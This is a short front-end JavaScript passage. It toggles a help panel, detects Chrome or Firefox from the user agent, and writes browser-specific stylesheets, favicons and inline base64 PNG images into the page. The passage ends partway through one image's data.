// script 0
function toggleHelp() {
    var h = document.getElementById('help');
    if(h.style.display == 'block'){
        h.style.display = 'none';
    }
    else{
        h.style.display = 'block';
    }
}

var is_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
var is_firefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
if (is_chrome){
    document.write('<'+'link rel="stylesheet" type="text/css" href="chrome.css" />');
    document.write('<'+'link rel="icon" type="image/x-icon" href="data:image/ico;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABMLAAATCwAAAAAAAAAAAABBQBgAPz8XAD8/MQVCQjYHQ0M2B0RENgdERDYHRUU2B0dHNQdISDUHSko1B0tLNQdMTDQHT084Azs7AABUVFMAS0u3AExMtxBUVMGOVFTBq1JSwKpRUb+qUFC/qlBQwapNTb+qSkq9qkhIvKpHR7yqRka7q0NDqVY9Pf8AU1NTAFFRwgBSUsIZXV3R2V1d0v9aWtH/WFjR/1JSyv9FRbb/SEi9/1BQz/9NTc7/S0vN/0lJzP9FRbeCRkb/AFNTUwBUVMUAVVXEGWJi0thiYtT/X1/T/l1d0/5RUcP+JiZ9/jk5nf5VVdD+UlLP/k9Pzv5MTM3/R0e3gU1N/wBTU1MAWFjGAFlZxhloaNTYZ2fV/2Rk1P5iYtT+VlbI/isrkf49Paj+V1fR/lZW0P5UVM/+UVHO/0pKuIFYWP8AU1NTAFxcyABdXcgZbW3V2G1t1v9qatX+Z2fW/lhYx/4wMJ7+Pj6r/lpa0f5YWNH+V1fQ/lVVz/9OTrmBY2P/AFNTUwBgYMsAYmLKGXNz19lyctj/b2/X/mxs1v9oaNT/XFzK/15ezv9gYNP/XFzS/1hY0f5XV9D/UFC6gmpq/wBTU1MAYGDKAFpayg18fNOGp6bb85iXzfJubsufZ2fRjmVl0Y9hYdCPXFzOjX9/zsORkcn/cHC90ExMt0ZdXv8AVFRUAAAAAADKyccAz87LH+bl4+HKycbjj4+MJpSUkQAAAAAAVVQfAPr5+QDS0c53zMvH/6akoZEAAAAAUFBEAAAAAAAAAAAAzczMANHQ0CDo5+bhzs3L45GRkCaXlpUAAAAAAFBQUAD6+vgA0tHQd87Ny/+pqKaRAAAAAFNTUwAAAAAAAAAAAM/OzgDU09Ma6urp2tTS0e2ZmJg2rayrAAAAAABzc3IA////ANLR0IrR0M7/rauqhP///wBTU1MAAAAAAAAAAADExMMAwsHBB+3s7LHg397/uLi3jExMTAyJiYgA////AKqpqCrU09HSz83M+qmop1TT0c8AVFRUAAAAAAAAAAAAgoKBAP79/QDn5+ZS6unp8tzb2vXEw8KpuLe2cL69vX3OzMvN19XU/8bFw7mPjo4Um5qaAAAAAAAAAAAAAAAAAAAAAADT0tEAycjIBebl5HHm5eTo4uHg/97c2//b2tj/2dfW+8/Ozb2zsrEv5OPhAEFBQQAAAAAAAAAAAAAAAAAAAAAAAAAAAM3MzADGxcUD29rZNN3d23rd3Nqa2NfVkM7NzFy1tLMW////AE9PTwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAMAAIADAACAAwAAgAMAAIADAACAAwAAgAMAAIADAADDwwAAw8MAAMPHAADBhwAA4AcAAOAPAADwHwAA/n8AAA==" />');
}
else if (is_firefox){
    document.write('<'+'link rel="stylesheet" type="text/css" href="firefox.css" />')
    document.write('<'+'link rel="icon" type="image/x-icon" href="icon/firefox_fav.ico" />');
}
else{
    document.write('<'+'link rel="stylesheet" type="text/css" href="ie.css" />');
    document.write('<'+'link rel="icon" type="image/x-icon" href="icon/ie_fav.ico" />');
}

// script 1

if (is_chrome)
    document.write('<'+'img src="data:image/png;base64,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"/>');
else if (is_firefox)
    document.write('<'+'img src="data:image/png;base64,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